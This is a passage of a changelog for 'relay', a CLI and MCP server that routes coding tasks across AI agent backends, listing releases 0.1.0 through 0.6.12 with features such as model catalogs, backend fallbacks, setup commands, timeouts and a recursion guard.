- Catalog: GLM-5.2 promoted `cheap` → `workhorse`; starter directive routes the `work` tier to cursor/glm-5.2 first (~35% cheaper than grok-4.5 at the same quality bar), with grok-4.5 as first fallback

### Fixed

- `relay backends` now shows "disabled by you" for tools that aren't installed (the disable was applied but invisible)

## [0.6.11] — 2026-07-22

### Fixed

- Invalid `router.yaml` now fails with a readable field-by-field error plus a `relay init --force` hint, instead of a raw JSON validation dump
- Failed runs show the backend's actual error: the run summary gains a `why:` line and `backend_done` carries an excerpt of the backend's output

## [0.6.10] — 2026-07-22

### Fixed

- Verify can no longer hang a run: verify commands run with `CI=1` (flips vitest/jest/react-scripts out of watch mode) and a 10-minute kill timer that reports as a verify failure

## [0.6.9] — 2026-07-22

### Fixed

- Walkaway runs now commit on the relay/* branch instead of leaving edits merely staged; the CLI summary and MCP reply state the branch, worktree path, and explicit reconcile instructions (no auto-merge)

## [0.6.8] — 2026-07-22

### Added

- `relay uninstall [--purge]`: deregisters the MCP server from Cursor/Claude/Codex (CLI removal first, config-file edit with `.relay-bak` backups as fallback), optionally purges `~/.config/relay` + `~/.local/share/relay`, then points at `brew uninstall relay`

## [0.6.7] — 2026-07-22

### Added

- Backend opt-in: `relay setup` asks per detected tool, `relay backends [enable|disable <tool>]` changes it anytime, and agents get the `relay_backends` MCP tool. Stored in `~/.config/relay/settings.yaml` (separate from the shareable directive); disabled backends vanish from routing and are marked in doctor output

## [0.6.6] — 2026-07-22

### Added

- Pollable progress feed: runs log phase events to `~/.local/share/relay/events/<id>.jsonl`; `relay_status {id}` / `relay status <id>` return the feed plus current phase; MCP hosts passing a progressToken get live `notifications/progress` updates
- True fire-and-poll: `relay_run {wait:false}` returns the run id immediately while the run continues server-side

### Fixed

- Walkaway runs no longer leave `?? .relay/` noise in the main tree's `git status`; the scratch dir is added to `.git/info/exclude` (never touches the user's .gitignore)

### Changed

- Worktree lanes are strictly opt-in: lanes with `walkaway: true` are skipped unless the caller explicitly requests walkaway; a bare "implement X" routes to a staged-edit lane

## [0.6.5] — 2026-07-22

### Fixed

- Worker briefs now state an empty diff is a valid outcome, preventing invented edits on no-op tasks that previously escalated to the frontier tier for negative savings

## [0.6.4] — 2026-07-22

### Fixed

- `relay_run` now takes a `cwd` argument (validated absolute path) and echoes the cwd used, so delegated tasks run in the session's repo instead of the MCP server's launch directory
- Brief validation at the MCP boundary: bare strings for `files`/`constraints`/`done_means` are coerced to single-item lists instead of erroring

## [0.6.3] — 2026-07-21

### Fixed

- Staging no longer silently fails for the first changed file: `git status` is now parsed via NUL-separated `--porcelain -z` (with rename handling) instead of trimming the leading space of ` M` entries and corrupting the path

## [0.6.2] — 2026-07-21

### Changed

- `relay setup` auto-registers MCP in Cursor (`~/.cursor/mcp.json`), Claude Code (`claude mcp add`, JSON fallback), and Codex (`codex mcp add`, TOML fallback) — no manual config editing

## [0.6.1] — 2026-07-21

### Added

- Recursion guard: backends spawn workers with `RELAY_WORKER=1`; worker briefs open with a do-not-re-delegate line; `relay_run` (MCP) and `runTask` (CLI/REPL) hard-refuse inside a worker (`RELAY_ALLOW_NESTED=1` overrides)

### Changed

- Probe tests: longer timeout on auth-heavy cases (real CLIs can exceed 5s)

## [0.6.0] — 2026-07-21

### Added

- Freshness reminders, pull-only: doctor/status surface a one-line hint when the public catalog on main is newer than local or a newer release exists; backed by a quiet 24h-cached GET of two public GitHub files; opt out with `RELAY_NO_UPDATE_CHECK=1`; offline machines get a network-free stale-catalog hint after 45 days
- `bench/`: open micro-benchmark — six deterministic bug-fix fixtures run through routed vs forced-frontier arms with identical prompts, graded by each repo's own tests; results in `bench/results/` (2026-07-21: quality parity 6/6 = 6/6, median cost ratio 5.2×)

## [0.5.1] — 2026-07-20

### Fixed

- Cursor backend maps catalog ids to cursor-agent's real model ids (`grok-4.5`+effort → `cursor-grok-4.5-medium`, `gpt-5.6-luna` → `gpt-5.6-luna-low`, …); status and quickfix lanes now complete end-to-end on the cursor backend
- Auth probe no longer misreads the per-repo workspace-trust prompt as a login failure
- Catalog ids corrected to what cursor actually serves: `kimi-k2.7-code` (was kimi-k3), `gemini-3.1-pro` (was gemini-3-pro); haiku is claude-only

## [0.5.0] — 2026-07-20

### Added

- Probe layer: distinguishes app-installed / CLI-installed / signed-in-for-headless per tool; auth checks cached 24h in `~/.local/share/relay/probe.json`, presence always live
- Guided `relay setup`: plain-language tool status, offers to run sign-ins (browser pops) instead of printing commands; `--yes` / `--no-input`
- `relay login <tool>`: one command to run any backend's sign-in flow
- MCP `relay_doctor` + `relay_login`: agents can diagnose and fix missing/unauthenticated tools mid-conversation
- `relay doctor [--fresh]` leads with the plain-language tool picture

### Fixed

- All backend invocations get a hard timeout (default 10 min, `RELAY_BACKEND_TIMEOUT_MS` to override); a hung CLI fails over to the next fallback backend instead of stalling the run

## [0.4.2] — 2026-07-20

### Fixed

- Backend hard-failure (auth error, crash) now retries the same tier on the next fallback backend instead of escalating models
- Claude backend maps catalog ids to the CLI's model aliases (sonnet-5 → sonnet), passes `--verbose` (required for stream-json), and uses `--permission-mode acceptEdits` for edit lanes — still never `--dangerously-skip-permissions`
- Only files touched by the run are attributed/staged; pre-existing uncommitted work is left alone
- `relay doctor` probes cursor headless auth with a real invocation
- `fake` backend removed from availability unless `RELAY_ALLOW_FAKE` is set

## [0.4.1] — 2026-07-20

### Added

- Release workflow auto-bumps the homebrew-tap formula (deploy-key push; no manual sha256 ritual)
- Catalog freshness CI auto-files a `catalog` issue on failure (deduped)
- AGENTS.md documents the catalog maintenance ritual (data ships from main via `relay update`; no release required)

## [0.4.0] — 2026-07-20

### Added

- Codex backend (verified against codex-cli 0.139): `codex exec` with workspace-write sandbox — never passes approval-bypass flags
- Experimental gemini / grok / kimi adapters via a spec-driven generic CLI backend; adding a new agent CLI is now one table entry
- Catalog: `gemini-3-flash`, `gemini-3-pro`; codex/grok/kimi serving entries for existing models
- Default directive: codex + gemini fallback candidates on every tier, so codex-only or gemini-only machines route out of the box
- Catalog CI now fails if a catalog backend has no relay adapter

## [0.3.0] — 2026-07-19

### Added

- Model catalog (`defaults/catalog.yaml`): prices + quality class (`nano/cheap/workhorse/opus-class/frontier`) + serving backends per model; embedded in the binary, feeds receipts for models missing from prices.yaml
- `relay update [--check]` — fetches the latest catalog from the repo (facts only, never touches router.yaml) and reports newer binary releases
- `relay advise [--apply]` — proposes cheaper same-quality-class models available on installed backends; `--apply` prepends them to tier fallbacks as a git-visible edit; cites local verify-success rates when ≥3 runs exist
- `relay setup` — one command to register relay as an MCP server in Cursor and Claude Code, with backups; prints Codex snippet
- Catalog freshness CI — nightly job fails when the catalog is inconsistent with the default directive or unreviewed for 45 days
- `relay savings --by-model` now shows verify success per model
- Latency guard: advise never swaps a fast-flagged model for a slower one
- MCP `relay_run` description teaches expensive agents when to delegate

## [0.2.0] — 2026-07-19

### Added

- Tiers accept an ordered fallback list of `{backend, model}` candidates; the first candidate whose backend CLI is installed wins, so single-backend machines route every tier without config changes
- Default directive ships claude fallbacks for all six tiers
- `relay doctor` prints per-tier resolution for this machine, marking fallbacks
- Dry-run output flags when a tier resolved via fallback
- Prices for `sonnet-5` and `haiku-4.5`

### Changed

- Escalating onto a tier with no installed backend now stops the run with an actionable message instead of crashing

## [0.1.1] — 2026-07-19

### Fixed

- Embed default `router.yaml` / `prices.yaml` in the compiled binary so `relay` works without loose data files

## [0.1.0] — 2026-07-19

### Added

- Initial release: Bun + TypeScript CLI compiled to a single binary
- Directive loader (`router.yaml`) with zod validation and starter defaults
- Rules-first task router (lanes: status, quickfix, build, review)
- Backends: `cursor-agent`, `claude -p`, plus `fake` for CI
- Context assembly (git status/diff, named files, AGENTS.md, optional `bd`)
- Verify → widen → escalate loop with auto-detected lint/test commands
- Git-native visibility: stage by default; worktree + draft PR for build lane
- Savings receipts via `prices.yaml` (measured vs estimated labels)
- Local run log at `~/.local/share/relay/runs.jsonl`
- MCP server: `relay_run`, `relay_status`, `relay_savings`
- `relay doctor`, `relay init`, `relay savings`, `relay status`, REPL (`-i`)
- Homebrew tap formula path + curl install script
- GitHub Actions: CI (test/typecheck) and tag-triggered multi-arch release

[Unreleased]: https://github.com/yoreai/relay/compare/v0.12.2...HEAD
[0.12.2]: https://github.com/yoreai/relay/compare/v0.12.1...v0.12.2
[0.12.1]: https://github.com/yoreai/relay/compare/v0.12.0...v0.12.1
[0.12.0]: https://github.com/yoreai/relay/compare/v0.11.0...v0.12.0
[0.11.0]: https://github.com/yoreai/relay/compare/v0.10.0...v0.11.0
[0.10.0]: https://github.com/yoreai/relay/compare/v0.9.1...v0.10.0
[0.9.1]: https://github.com/yoreai/relay/compare/v0.9.0...v0.9.1
[0.9.0]: https://github.com/yoreai/relay/compare/v0.8.4...v0.9.0
[0.8.4]: https://github.com/yoreai/relay/compare/v0.8.3...v0.8.4
[0.8.3]: https://github.com/yoreai/relay/compare/v0.8.2...v0.8.3
[0.8.2]: https://github.com/yoreai/relay/compare/v0.8.1...v0.8.2
[0.8.1]: https://github.com/yoreai/relay/compare/v0.8.0...v0.8.1
[0.8.0]: https://github.com/yoreai/relay/compare/v0.7.2...v0.8.0
[0.7.2]: https://github.com/yoreai/relay/compare/v0.7.1...v0.7.2
[0.7.1]: https://github.com/yoreai/relay/compare/v0.7.0...v0.7.1
[0.7.0]: https://github.com/yoreai/relay/compare/v0.6.19...v0.7.0
[0.6.19]: https://github.com/yoreai/relay/compare/v0.6.18...v0.6.19
[0.6.18]: https://github.com/yoreai/relay/compare/v0.6.17...v0.6.18
[0.6.17]: https://github.com/yoreai/relay/compare/v0.6.16...v0.6.17
[0.6.16]: https://github.com/yoreai/relay/compare/v0.6.15...v0.6.16
[0.6.15]: https://github.com/yoreai/relay/compare/v0.6.14...v0.6.15
[0.6.14]: https://github.com/yoreai/relay/compare/v0.6.13...v0.6.14
[0.6.13]: https://github.com/yoreai/relay/compare/v0.6.12...v0.6.13
[0.6.12]: https://github.com/yoreai/relay/compare/v0.6.11...v0.6.12
[0.6.11]: https://github.com/yoreai/relay/compare/v0.6.10...v0.6.11
[0.6.10]: https://github.com/yoreai/relay/compare/v0.6.9...v0.6.10
[0.6.9]: https://github.com/yoreai/relay/compare/v0.6.8...v0.6.9
[0.6.8]: https://github.com/yoreai/relay/compare/v0.6.7...v0.6.8
[0.6.7]: https://github.com/yoreai/relay/compare/v0.6.6...v0.6.7
[0.6.6]: https://github.com/yoreai/relay/compare/v0.6.5...v0.6.6
[0.6.5]: https://github.com/yoreai/relay/compare/v0.6.4...v0.6.5
[0.6.4]: https://github.com/yoreai/relay/compare/v0.6.3...v0.6.4
[0.6.3]: https://github.com/yoreai/relay/compare/v0.6.2...v0.6.3
[0.6.2]: https://github.com/yoreai/relay/compare/v0.6.1...v0.6.2
[0.6.1]: https://github.com/yoreai/relay/compare/v0.6.0...v0.6.1
[0.6.0]: https://github.com/yoreai/relay/compare/v0.5.1...v0.6.0
[0.5.1]: https://github.com/yoreai/relay/compare/v0.5.0...v0.5.1
[0.5.0]: https://github.com/yoreai/relay/compare/v0.4.2...v0.5.0
[0.4.2]: https://github.com/yoreai/relay/compare/v0.4.1...v0.4.2
[0.4.1]: https://github.com/yoreai/relay/compare/v0.4.0...v0.4.1
[0.4.0]: https://github.com/yoreai/relay/compare/v0.3.0...v0.4.0
[0.3.0]: https://github.com/yoreai/relay/compare/v0.2.0...v0.3.0
[0.2.0]: https://github.com/yoreai/relay/compare/v0.1.1...v0.2.0
[0.1.1]: https://github.com/yoreai/relay/releases/tag/v0.1.1
[0.1.0]: https://github.com/yoreai/relay/releases/tag/v0.1.0
